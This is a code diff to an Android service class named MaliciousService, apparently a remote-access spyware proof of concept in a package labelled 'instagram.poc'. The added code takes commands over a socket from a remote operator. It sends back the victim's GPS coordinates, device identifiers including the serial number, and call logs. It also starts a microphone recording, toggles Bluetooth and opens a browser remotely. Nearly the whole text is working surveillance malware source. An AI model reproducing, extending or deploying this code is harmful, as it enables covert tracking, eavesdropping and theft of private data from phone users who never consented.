@@ -2,20 +2,28 @@ package com.merams.esd.instagram.poc;
 
 import android.annotation.SuppressLint;
 import android.app.Service;
+import android.bluetooth.BluetoothAdapter;
 import android.content.ContentResolver;
 import android.content.Intent;
 import android.database.Cursor;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
+import android.os.StrictMode;
+import android.provider.Browser;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.util.Log;
 import android.widget.Toast;
 
+import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
+import androidx.core.content.FileProvider;
 
 import java.io.BufferedReader;
 import java.io.DataInputStream;
@@ -29,7 +37,12 @@ import java.io.PrintWriter;
 import java.net.Socket;
 import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
+import java.util.Collections;
 import java.util.List;
+
+import me.everything.providers.android.browser.BrowserProvider;
+import me.everything.providers.android.browser.Search;
+import me.everything.providers.android.calllog.CallsProvider;
 
 /*
 *
@@ -52,6 +65,22 @@ public class MaliciousService extends Service {
     private List<String> contactList;
     private List<String> tmpList;
     private MediaRecorder recorder;
+    private LocationManager mLocMan;
+    private boolean isRecording;
+    private String tmpString;
+    private String s_type;
+    private String _OSVERSION = System.getProperty("os.version");
+    private String _RELEASE = android.os.Build.VERSION.RELEASE;
+    private String _DEVICE = android.os.Build.DEVICE;
+    private String _MODEL = android.os.Build.MODEL;
+    private String _PRODUCT = android.os.Build.PRODUCT;
+    private String _BRAND = android.os.Build.BRAND;
+    private String _HARDWARE = android.os.Build.HARDWARE;
+    private String _ID = android.os.Build.ID;
+    private String _MANUFACTURER = android.os.Build.MANUFACTURER;
+    private String _SERIAL = android.os.Build.SERIAL;
+    private String _USER = android.os.Build.USER;
+    private String _HOST = android.os.Build.HOST;
 
 
     @Nullable
@@ -72,7 +101,8 @@ public class MaliciousService extends Service {
     public void onDestroy() {
         super.onDestroy();
 
-        recorder.stop();
+        if(isRecording){ recorder.stop(); }
+
     }
 
     private void InitServerConnection(String ipaddr, int port){
@@ -111,6 +141,7 @@ public class MaliciousService extends Service {
 
                                             os.write("Hooking on internal microphone, now listening ...".getBytes(StandardCharsets.UTF_8));
                                             os.flush();
+                                            isRecording = StartMaliciousRecorder();
 
                                         } catch (FileNotFoundException e) {
 
@@ -121,6 +152,8 @@ public class MaliciousService extends Service {
                                             e.printStackTrace();
 
                                         }
+
+                                        break;
 
                                     case "snapshot":
                                         try {
@@ -137,6 +170,8 @@ public class MaliciousService extends Service {
                                             e.printStackTrace();
 
                                         }
+
+                                        break;
 
                                     case "sms":
 
@@ -155,6 +190,7 @@ public class MaliciousService extends Service {
                                         Thread.sleep(2000);
                                         os.write("[FLG] Done Sending".getBytes(StandardCharsets.UTF_8));
                                         os.flush();
+                                        break;
 
                                     case "call":
 
@@ -173,6 +209,7 @@ public class MaliciousService extends Service {
                                         Thread.sleep(2000);
                                         os.write("[FLG] Done Sending".getBytes(StandardCharsets.UTF_8));
                                         os.flush();
+                                        break;
 
                                     case "contact":
 
@@ -191,6 +228,40 @@ public class MaliciousService extends Service {
                                         Thread.sleep(2000);
                                         os.write("[FLG] Done Sending".getBytes(StandardCharsets.UTF_8));
                                         os.flush();
+                                        break;
+
+                                    case "location":
+
+                                        mLocMan = (LocationManager) getSystemService(getApplicationContext().LOCATION_SERVICE);
+                                        Location location = mLocMan.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                                        double lat = location.getLatitude();
+                                        double lon = location.getLongitude();
+
+                                        os.write(("Here are the coordinates of the target:\n "+String.valueOf(lat)+" Long: "+String.valueOf(lon)).getBytes(StandardCharsets.UTF_8));
+                                        os.write("[FLG] Done Sending".getBytes(StandardCharsets.UTF_8));
+                                        os.flush();
+                                        break;
+
+                                    case "intel":
+
+                                        os.write(("Here are the intel i could get:\n\nManufacturer: "+_MANUFACTURER+"\nBrand: "+_BRAND+"\nDevice: "+_DEVICE+"\nProduct: "+_PRODUCT+"\nModel: "+_MODEL+"\nHardware: "+_HARDWARE+"\nOS: "+_OSVERSION+"\nRelease: "+_RELEASE+"\nSerial: "+_SERIAL+"\nID: "+_ID+"\nUser: "+_USER+"\nHost: "+_HOST+"\n").getBytes(StandardCharsets.UTF_8));
+                                        os.write("[FLG] Done Sending".getBytes(StandardCharsets.UTF_8));
+                                        os.flush();
+                                        break;
+
+                                    case "bluetooth":
+
+                                        EnableBluetooth();
+                                        os.write("[FLG] Done".getBytes(StandardCharsets.UTF_8));
+                                        os.flush();
+                                        break;
+
+                                    case "internet":
+
+                                        OpenBrowser("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+                                        os.write("[FLG] Done".getBytes(StandardCharsets.UTF_8));
+                                        os.flush();
+                                        break;
 
 
                                     default:
@@ -221,7 +292,7 @@ public class MaliciousService extends Service {
     }
 
     @SuppressLint("WrongConstant")
-    private void StartMaliciousRecorder(){
+    private boolean StartMaliciousRecorder(){
 
         //Recorder Base Configuration
         File path = getApplicationContext().getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS);
@@ -245,11 +316,13 @@ public class MaliciousService extends Service {
 
             //Start Recorder
             recorder.start();
+            return true;
 
         } catch (Exception e) {
 
             Log.e("ERROR", e.getMessage());
             e.printStackTrace();
+            return false;
         }
 
     }
@@ -284,11 +357,66 @@ public class MaliciousService extends Service {
             @SuppressLint("Range") String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));
             @SuppressLint("Range") int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)));
 
-            callList.add("Number: "+num+" Name: "+name+" Duration: "+duration+" Type: "+Integer.toString(type));
+            switch (type){
+
+                case 1:
+                    s_type = "Incoming";
+                    break;
+
+                case 2:
+                    s_type = "Outgoing";
+                    break;
+
+                case 3:
+                    s_type = "Missed";
+                    break;
+
+                case 4:
+                    s_type = "VoiceMail";
+                    break;
+
+                case 5:
+                    s_type = "Rejected";
+                    break;
+
+                case 6:
+
+                    s_type = "Refused List";
+                    break;
+
+                default:
+                    continue;
+
+            }
+
+
+
+            callList.add("Number: "+num+" Name: "+name+" Duration: "+String.valueOf(Integer.parseInt(duration)/60)+"min"+" Type: "+s_type);
 
         }
 
         return callList;
+    }
+
+    private void EnableBluetooth(){
+
+        BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
+        if (!mBluetoothAdapter.isEnabled()) {
+
+            mBluetoothAdapter.enable();
+        }else{
+
+            mBluetoothAdapter.disable();
+        }
+
+
+    }
+
+    private void OpenBrowser(String url){
+
+        Intent bIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+        bIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(bIntent);
     }
 
     @SuppressLint("Range")
